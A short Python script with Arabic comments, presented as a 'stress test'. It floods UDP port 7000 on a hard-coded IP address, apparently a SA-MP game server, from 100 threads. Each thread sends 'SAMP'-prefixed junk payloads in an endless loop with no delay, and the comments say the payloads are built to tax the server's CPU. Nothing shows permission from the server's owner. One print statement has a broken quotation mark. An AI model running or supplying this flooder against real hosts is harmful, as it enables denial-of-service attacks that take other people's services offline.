import socket
import threading
import sys

# معلومات الهدف
TARGET_IP = "89.46.1.130"  # IP السيرفر
TARGET_PORT = 7000        # المنفذ
THREADS_COUNT = 100       # عدد الخيوط (كلما زاد الرقم، زاد الضغط على الشبكة والـ CPU)

def stress_worker():
    # إنشاء اتصال UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # حمولة (Payload) بحجم أكبر وبنية تجبر المعالج على محاولة معالجتها وتحليلها
    payload = b'SAMP' + b'\xFF' * 1024
    
    print(طبدأ تشغيل خيط الضغط...")
    while True:
        try:
            # إرسال الحزم بأقصى سرعة ممكنة بدون تأخير (No Sleep)
            client.sendto(payload, (TARGET_IP, TARGET_PORT))
        except Exception as e:
            # تجاهل الأخطاء البسيطة للاستمرار في الإرسال دون توقف
            pass

def main():
    print(f"=== بدء اختبار الضغط الشامل على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS_COUNT} خيط ===")
    print("اضغط Ctrl+C لإيقاف الاختبار يدوياً.")
    
    threads = []
    
    # تشغيل الخيوط بالتوازي
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=stress_worker)
        t.daemon = True
        threads.append(t)
        t.start()
        
    try:
        # إبقاء البرنامج يعمل لمواصلة الضغط
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\nتم إيقاف الاختبار بواسطة المستخدم.")
        sys.exit(0)

if __name__ == "__main__":
    main()
